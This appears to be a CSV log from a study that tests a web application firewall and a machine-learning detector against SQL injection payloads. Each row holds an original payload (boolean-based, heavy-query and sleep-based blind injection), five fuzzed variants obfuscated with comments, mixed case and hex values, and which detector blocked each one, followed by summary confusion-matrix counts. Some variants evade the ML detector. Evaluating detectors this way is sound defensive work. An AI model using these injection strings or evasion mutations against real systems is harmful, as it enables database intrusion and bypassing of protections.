Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
46,2024-12-16T20:48:26.647568,"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo",403,403,403,both_correct,"(SElecT 1843 In ((SELecT 1),1843,1844))'   )    )    or 4411  =
   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers/**/as sys7  )   and    (    (   'holo'  =  'holo",2024-12-16T20:48:36.921003,403,403,both_correct,"(SelecT 1843 iN ((SelEct 1),'f8(' NOT LIKE 'f8(n', OR 0))'   )    )    or (SELECT 4411)  =	   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as/**/sys4,sysusers as sys5,sysusers as sys6,sysusers/**/as sys7  )   and    (    (   'holo'  =  'holo",2024-12-16T20:48:50.386702,403,403,both_correct,"(sElEcT '.B8'<>'.B84' iN ((sELECT (selECt 1)),'f8(' not like 'f8(n', oR 0))'   )    )    or (SELECT (SELECT 1))  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers/**/as sys3,sysusers as/**/sys4,sysusers as sys5,sysusers as sys6,sysusers/**/as sys7  )   and    (    (   'holo'  =  'holo",2024-12-16T20:49:04.984143,403,403,both_correct,"(sELect '.B8' NOT LIKE '.B84' In ((SELect (SeLeCt 0x1)),'f8(' not like 'f8(n', Or  AND 1))'   )    )    or (SELECT (SELECT 'J'<>'J1'))  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers/*G*/as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers/**/as sys7 	)   and    (    (   'holo'  =  'holo",2024-12-16T20:49:21.210210,403,403,both_correct,"(sElEcT '.B8' not like '.B84' IN ((SElect (sELeCt 0x1)),'f8(' not like 'f8(n', Or  aNd 0x1))'   )    )    or (SELECT (SELECT 'J'<>'J1'))  =    (  select count  (
 *  )   from sysusers as sys1,sysusers as sys2,sysusers/**/as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 	)   and    (    (   'holo'  =  'holo",2024-12-16T20:49:38.090738,403,403,both_correct
47,2024-12-16T20:49:55.176413,-9875'  )   or   (  8459  =  8459  )  *4906 and   (  'mrxw'  =  'mrxw,403,403,200,waf_correct_ml_incorrect,- AnD 1'  )   or   (  0x210b  =  ':L'<>':L$'	 )  *4906 and   (/**/ 'mrxw'  =  'mrxw,2024-12-16T20:49:58.538853,403,200,waf_correct_ml_incorrect,"- aNd  OR 2976 like 2976'  )   or   (  0x210b  =  ':L'<>':L$'
 )  *0x132a and   (/**/ 'mrxw'  =/**/ 'mrxw",2024-12-16T20:50:03.530335,403,200,waf_correct_ml_incorrect,"- aND  Or  or 933 IN (932,933,934) lIKe 0xba0'  )   or   (  0x210b  =  ':L'<>':L$'  )  *0x132a and   (  'mrxw'  =/*eCV*/ 'mrxw",2024-12-16T20:50:09.825788,403,200,waf_correct_ml_incorrect,"- and  oR  oR 933 iN/*\lu*/(0x3a4, OR 0,'DK'!='DK{') Like 0xba0'  )   or   (  0x210b  =  ':L'<>':L$'  )  *0x132a and   (	 'mrxw'  =/**/ 'mrxw",2024-12-16T20:50:16.860144,403,200,waf_correct_ml_incorrect,"- AND  Or  OR 'k>' LIke 'k>' In/*\lu*/(0x3a4, OR  OR (SELECT 0),'DK' NOT LIKE 'DK{') Like 0xba0'  )   or   (
 0x210b  = /**/':L'<>':L$'  )  *0x132a and   (	 'mrxw'  =/**/ 'mrxw",2024-12-16T20:50:24.671765,200,403,waf_incorrect_ml_correct
48,2024-12-16T20:50:34.377517,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""uvoq"" like ""uvoq",403,403,403,both_correct,"(selecT 'V'!='Vg')"" or   (  select * from   (  select  (  sleep /**/(  0x5   )    )    	)  ydpu  )   and ""uvoq"" like ""uvoq",2024-12-16T20:50:39.136321,403,403,both_correct,"(seLECT 'V' not like 'Vg')"" or   (  select * from   (  select  (  sleep  (  0x5   )    )    	)  ydpu	 )   and ""uvoq"" like ""uvoq",2024-12-16T20:50:46.020293,403,403,both_correct,"(SElEcT 'V' not like 'Vg')"" or   (  select * from   (  select  (  sleep  (/**/ 0x5   )    ) 	  	)  ydpu	 )   and ""uvoq"" like ""uvoq",2024-12-16T20:50:53.143461,403,403,both_correct,"(sEleCT 'V' not like 'Vg')"" or   (  select * from   ( /**/select  (  sleep  (/*{xPr*/ 0x5	  )    ) 	  	)  ydpu	 )   and ""uvoq"" like ""uvoq",2024-12-16T20:51:00.556819,403,403,both_correct,"(sElECT 'V' not like 'Vg')"" or   (  select * from   ( /*}#Q*/select  (  sleep  (  0x5	  )    ) 	  	)  ydpu  )   and ""uvoq"" like ""uvoq",2024-12-16T20:51:08.181568,403,403,both_correct
49,2024-12-16T20:51:15.500204,c4nt0rn,200,200,200,both_correct,c4nt0rn,2024-12-16T20:51:15.968570,200,200,both_correct,c4nt0rn,2024-12-16T20:51:17.435012,200,200,both_correct,c4nt0rn,2024-12-16T20:51:18.905400,200,200,both_correct,c4nt0rn,2024-12-16T20:51:20.392084,200,200,both_correct,c4nt0rn,2024-12-16T20:51:21.880276,200,200,both_correct
50,2024-12-16T20:51:23.345441,5.74629E+15,200,200,200,both_correct,"(SELECT
2547 not like 2548).74629E+0xf",2024-12-16T20:51:23.997241,403,403,both_incorrect,(select	 AND 1 not like/**/0x9f4).74629E+0xf,2024-12-16T20:51:26.943406,403,403,both_incorrect,(seLEct/**/ && (SElECT  OR 0<>9555) not like/*t+#t*/0x9f4).74629E+0xf,2024-12-16T20:51:30.418192,403,200,waf_incorrect_ml_correct,"(sEleCT   AND  (SEleCt  oR	'K' LiKe 'K'<> aND 0x1) not like/*-*/0x9f4).74629E+0xf",2024-12-16T20:51:34.882878,403,200,waf_incorrect_ml_correct,"(SELEcT/*gQ*/ 	aNd  (SelECt  or	 aND 't[q<""' NOT LIKE 't[q<""$'!= AND 0x1) not like/**/0x9f4).74629E+0xf",2024-12-16T20:51:39.838288,403,403,both_incorrect

Overall Results
WAF TP,159
WAF TN,104
WAF FP,16
WAF FN,21
ML TP,107
ML TN,96
ML FP,24
ML FN,73

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,190,13
ML Incorrect,73,24
